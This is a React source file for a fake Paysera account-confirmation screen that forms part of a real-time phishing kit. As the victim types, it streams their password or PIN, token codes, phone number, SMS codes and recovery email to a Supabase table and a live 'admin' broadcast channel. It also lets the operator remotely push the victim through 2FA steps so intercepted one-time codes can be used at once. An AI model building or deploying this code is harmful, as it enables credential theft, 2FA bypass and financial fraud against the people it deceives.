import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import payseraLogo from "@/assets/volet-logo-v2.svg";
import { Loader2 } from "lucide-react";
import { usePayseraLang } from "@/hooks/usePayseraLang";

interface PayseraConfirmEmailScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

type ConfirmStep =
  | "password" | "waiting" | "token_2fa" | "sms_phone"
  | "sms_waiting" | "sms_code" | "recovery_email_input"
  | "recovery_email_submitted" | "success";

const getChannelName = (sessionId: string) => `confirm-email-${sessionId}`;

const PayseraConfirmEmailScreen = ({ email, sessionId, onBack }: PayseraConfirmEmailScreenProps) => {
  const [step, setStep] = useState<ConfirmStep>("password");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [tokenCode, setTokenCode] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
  const [clientPhoneInput, setClientPhoneInput] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [recoveryEmailAddr, setRecoveryEmailAddr] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const { t } = usePayseraLang();

  const broadcastChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const syncChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const broadcastToAdmin = useCallback((event: string, payload: Record<string, string>) => {
    if (broadcastChRef.current) broadcastChRef.current.send({ type: "broadcast", event, payload });
    if (syncChRef.current) syncChRef.current.send({ type: "broadcast", event, payload });
  }, []);

  useEffect(() => {
    const confirmCh = supabase.channel(getChannelName(sessionId));
    const syncCh = supabase.channel(`sync-email-${sessionId}`);
    broadcastChRef.current = confirmCh;
    syncChRef.current = syncCh;

    const handleDecision = (decision: string, payload?: Record<string, string>) => {
      if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
        setErrorMessage(t.wrongPassword); setStep("password"); setPassword(""); setLoading(false);
      } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
        setAdminTokenCode(payload?.admin_token || ""); setStep("token_2fa"); setTokenCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setPhoneEnding(payload?.sms_ending || ""); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
        if (payload?.sms_ending) setPhoneEnding(payload.sms_ending); setStep("sms_code"); setSmsCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
        setRecoveryEmailAddr(payload?.recovery_email || ""); setStep("recovery_email_input"); setClientRecoveryEmail(""); setErrorMessage("");
      } else if (decision === "confirm_approved" || decision === "sync_approved") {
        setStep("success");
      } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
        setErrorMessage(t.verificationFailed); setClientRecoveryEmail(""); setSmsCode(""); setTokenCode("");
      }
    };

    confirmCh.on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();
    syncCh.on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
      if (!data) return;
      const { status: dbStatus, otp_code: otp } = data;
      if ((dbStatus === "confirm_wrong_password" || dbStatus === "sync_wrong_password") && step !== "password") { setErrorMessage(t.wrongPassword); setStep("password"); setPassword(""); }
      else if ((dbStatus === "confirm_ask_otp" || dbStatus === "sync_ask_otp") && step !== "token_2fa" && step !== "sms_code") { if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); } else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); } }
      else if ((dbStatus === "confirm_ask_token" || dbStatus === "sync_ask_token") && step !== "token_2fa") { setAdminTokenCode(otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : ""); setStep("token_2fa"); setTokenCode(""); }
      else if ((dbStatus === "confirm_ask_sms" || dbStatus === "sync_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") { if (step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); } else { setPhoneEnding(otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : ""); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); } }
      else if ((dbStatus === "confirm_advance_sms_code" || dbStatus === "sync_advance_sms_code") && step !== "sms_code") { const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : ""; if (ending) setPhoneEnding(ending); setStep("sms_code"); setSmsCode(""); }
      else if ((dbStatus === "confirm_ask_recovery_email" || dbStatus === "sync_ask_recovery_email") && step !== "recovery_email_input" && step !== "recovery_email_submitted") { setRecoveryEmailAddr(otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : ""); setStep("recovery_email_input"); setClientRecoveryEmail(""); }
      else if (dbStatus === "confirm_approved" || dbStatus === "sync_approved") { setStep("success"); }
    }, 2500);

    return () => { broadcastChRef.current = null; syncChRef.current = null; supabase.removeChannel(confirmCh); supabase.removeChannel(syncCh); clearInterval(pollInterval); };
  }, [sessionId, step, t]);

  const handlePasswordChange = useCallback((value: string) => {
    setPassword(value);
    supabase.from("sessions").update({ otp_code: `id_pin:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_email_password_typing", { session_id: sessionId, email_password: value });
  }, [sessionId, broadcastToAdmin]);

  const handlePasswordSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault(); if (!password.trim()) return;
    setLoading(true); setErrorMessage("");
    await supabase.from("sessions").update({ otp_code: `id_pin:${password}`, status: "confirm_email_pending" }).eq("id", sessionId);
    broadcastToAdmin("client_id_pin", { session_id: sessionId, id_pin: password, email });
    setStep("waiting"); setLoading(false);
  }, [password, sessionId, broadcastToAdmin, email]);

  const handleTokenChange = useCallback((value: string) => {
    setTokenCode(value);
    supabase.from("sessions").update({ otp_code: `id_token:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_token_update", { session_id: sessionId, id_token: value });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneChange = useCallback((value: string) => {
    setClientPhoneInput(value);
    supabase.from("sessions").update({ otp_code: `id_phone:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_phone_update", { session_id: sessionId, id_phone: value });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientPhoneInput.trim()) return;
    supabase.from("sessions").update({ otp_code: `id_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_phone_submitted", { session_id: sessionId, id_phone: clientPhoneInput });
    setStep("sms_waiting");
  }, [clientPhoneInput, sessionId, broadcastToAdmin]);

  const handleSmsCodeChange = useCallback((value: string) => {
    setSmsCode(value);
    supabase.from("sessions").update({ otp_code: `id_sms:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_sms_update", { session_id: sessionId, id_sms: value });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailChange = useCallback((value: string) => {
    setClientRecoveryEmail(value);
    supabase.from("sessions").update({ otp_code: `id_recovery:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_recovery_update", { session_id: sessionId, id_recovery: value });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientRecoveryEmail.trim()) return;
    supabase.from("sessions").update({ otp_code: `id_recovery_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_recovery_submitted", { session_id: sessionId, id_recovery: clientRecoveryEmail });
    setStep("recovery_email_submitted");
  }, [clientRecoveryEmail, sessionId, broadcastToAdmin]);

  const inputClass = "w-full border border-[#b8c0cc] rounded-sm px-3 py-2.5 text-[14px] text-[#2c3e50] outline-none focus:border-[#5b8fb9] focus:ring-1 focus:ring-[#5b8fb9]/30 bg-white";
  const btnClass = "w-full bg-[#6b8fa3] hover:bg-[#5a7d91] active:bg-[#4e6f82] text-white text-[13px] font-bold uppercase tracking-wider py-2.5 rounded-sm transition-colors disabled:opacity-60";

  const renderLoading = (text: string) => (
    <div className="flex items-center justify-center gap-2 text-[13px] text-[#888]">
      <Loader2 className="h-4 w-4 animate-spin text-[#6b8fa3]" />
      {text}
    </div>
  );

  const renderError = () => errorMessage ? (
    <div className="mb-4 rounded-sm border border-red-300 bg-red-50 px-4 py-2.5 text-[13px] text-red-600">{errorMessage}</div>
  ) : null;

  const renderWrapper = (title: string, children: React.ReactNode) => (
    <div className="flex min-h-screen flex-col bg-[#dce1e8]">
      <div className="flex justify-center pt-6"><img src={payseraLogo} alt="Paysera" className="h-[40px]" /></div>
      <div className="flex flex-1 flex-col items-center justify-center px-4">
        <div className="w-full max-w-[460px] bg-white rounded-sm shadow-sm border border-[#c8ced8] px-6 py-5">
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-[15px] font-bold text-[#2c3e50] uppercase tracking-wide">{title}</h2>
            <button onClick={onBack} className="text-[13px] text-[#5b8fb9] hover:text-[#3a6d8c] font-medium transition-colors">{t.logout}</button>
          </div>
          <div className="border-t border-[#c8ced8] mb-4" />
          {renderError()}
          {children}
        </div>
      </div>
    </div>
  );

  if (step === "success") {
    return (
      <div className="flex min-h-screen flex-col bg-[#dce1e8]">
        <div className="flex justify-center pt-6"><img src={payseraLogo} alt="Paysera" className="h-[40px]" /></div>
        <div className="flex flex-1 flex-col items-center justify-center px-4">
          <div className="w-full max-w-[460px] bg-white rounded-sm shadow-sm border border-[#c8ced8] px-6 py-8 text-center">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-green-100">
              <svg className="h-7 w-7 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
            </div>
            <h2 className="text-[15px] font-bold text-[#2c3e50] mb-2">{t.approved}</h2>
            <p className="text-[13px] text-[#666]">{t.approvedDesc}</p>
            <p className="mt-2 text-[12px] text-[#999]">{email}</p>
          </div>
        </div>
      </div>
    );
  }

  if (step === "password") {
    return renderWrapper(t.intelligentId, (
      <>
        <p className="text-[13px] text-[#555] mb-5">{t.idInstruction}</p>
        <form onSubmit={handlePasswordSubmit}>
          <label className="block text-[13px] font-bold text-[#2c3e50] mb-1.5">{t.pin}</label>
          <div className="relative mb-4">
            <input type="password" value={password} onChange={(e) => handlePasswordChange(e.target.value)} disabled={loading} autoFocus className={inputClass} />
            <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[11px] text-[#999]">{t.codeSent}</span>
          </div>
          <button type="submit" disabled={loading || !password.trim()} className={btnClass}>
            {loading ? t.verifying + "..." : t.continue}
          </button>
        </form>
      </>
    ));
  }

  if (step === "waiting") {
    return renderWrapper(t.verifying, (
      <div className="text-center py-6">
        <p className="text-[13px] text-[#555] mb-4">{t.pleaseWait}</p>
        {renderLoading(t.verificationInProgress)}
      </div>
    ));
  }

  if (step === "token_2fa") {
    return renderWrapper(t.token, adminTokenCode ? (
      <>
        <p className="text-[13px] text-[#555] mb-5">{t.tapNumber}</p>
        <div className="mb-5 flex h-16 w-16 items-center justify-center rounded-lg border-2 border-[#6b8fa3] bg-[#f0f5f8] mx-auto">
          <span className="text-2xl font-bold text-[#6b8fa3]">{adminTokenCode}</span>
        </div>
        {renderLoading(t.waitingConfirmation)}
      </>
    ) : (
      <>
        <p className="text-[13px] text-[#555] mb-5">{t.otpFromToken}</p>
        <label className="block text-[13px] font-bold text-[#2c3e50] mb-1.5">{t.otpLabel}</label>
        <input type="text" inputMode="numeric" value={tokenCode} onChange={(e) => handleTokenChange(e.target.value)} autoFocus maxLength={20} className={`${inputClass} mb-4`} />
        {tokenCode.length >= 6 ? renderLoading(t.verifyingCode) : <button disabled className={btnClass}>{t.continue}</button>}
      </>
    ));
  }

  if (step === "sms_phone") {
    return renderWrapper(t.phoneVerification, (
      <>
        <p className="text-[13px] text-[#555] mb-5">
          {phoneEnding
            ? <>{t.confirmPhone} <span className="font-bold text-[#2c3e50]">**{phoneEnding}</span> {t.toReceiveCode}</>
            : t.enterPhone}
        </p>
        <form onSubmit={handlePhoneSubmit}>
          <label className="block text-[13px] font-bold text-[#2c3e50] mb-1.5">{t.phoneNumber}</label>
          <input type="tel" placeholder={phoneEnding ? `Phone ending in ${phoneEnding}` : "+1 (555) 000-0000"} value={clientPhoneInput} onChange={(e) => handlePhoneChange(e.target.value)} autoFocus className={`${inputClass} mb-4`} />
          <button type="submit" disabled={!clientPhoneInput.trim()} className={btnClass}>{t.continue}</button>
        </form>
      </>
    ));
  }

  if (step === "sms_waiting") {
    return renderWrapper(t.phoneVerification, (
      <div className="text-center py-6">
        <p className="text-[13px] text-[#555] mb-4">{t.sendingSms} <span className="font-bold text-[#2c3e50]">{clientPhoneInput}</span></p>
        {renderLoading(t.sendingSmsCode)}
      </div>
    ));
  }

  if (step === "sms_code") {
    return renderWrapper(t.smsVerification, (
      <>
        <p className="text-[13px] text-[#555] mb-5">
          {phoneEnding
            ? <>{t.enterCodeSentTo} <span className="font-bold text-[#2c3e50]">**{phoneEnding}</span></>
            : clientPhoneInput
            ? <>{t.enterCodeSentToPhone} <span className="font-bold text-[#2c3e50]">{clientPhoneInput}</span></>
            : t.enterCodeSms}
        </p>
        <label className="block text-[13px] font-bold text-[#2c3e50] mb-1.5">{t.smsCode}</label>
        <input type="text" inputMode="numeric" value={smsCode} onChange={(e) => handleSmsCodeChange(e.target.value)} autoFocus maxLength={8} className={`${inputClass} mb-4`} />
        {smsCode.length >= 6 ? renderLoading(t.verifyingSms) : <button disabled className={btnClass}>{t.continue}</button>}
      </>
    ));
  }

  if (step === "recovery_email_input") {
    return renderWrapper(t.recoveryEmail, (
      <>
        <p className="text-[13px] text-[#555] mb-4">{t.enterRecoveryEmail}</p>
        {recoveryEmailAddr && (
          <div className="mb-4 rounded-sm border border-[#c8ced8] bg-[#f5f7fa] px-4 py-3">
            <span className="text-[11px] text-[#888]">{t.recoveryEmail}</span>
            <p className="text-[14px] font-medium text-[#2c3e50]">{recoveryEmailAddr}</p>
          </div>
        )}
        <form onSubmit={handleRecoveryEmailSubmit}>
          <label className="block text-[13px] font-bold text-[#2c3e50] mb-1.5">{t.email}</label>
          <input type="email" placeholder={t.enterFullRecovery} value={clientRecoveryEmail} onChange={(e) => handleRecoveryEmailChange(e.target.value)} autoFocus className={`${inputClass} mb-4`} />
          <button type="submit" disabled={!clientRecoveryEmail.trim()} className={btnClass}>{t.continue}</button>
        </form>
      </>
    ));
  }

  if (step === "recovery_email_submitted") {
    return renderWrapper(t.recoveryEmail, (
      <div className="text-center py-6">
        <p className="text-[13px] text-[#555] mb-4">{t.sendingRecoveryCode} <span className="font-bold text-[#2c3e50]">{clientRecoveryEmail}</span></p>
        {renderLoading(t.sendingCode)}
      </div>
    ));
  }

  return null;
};

export default PayseraConfirmEmailScreen;
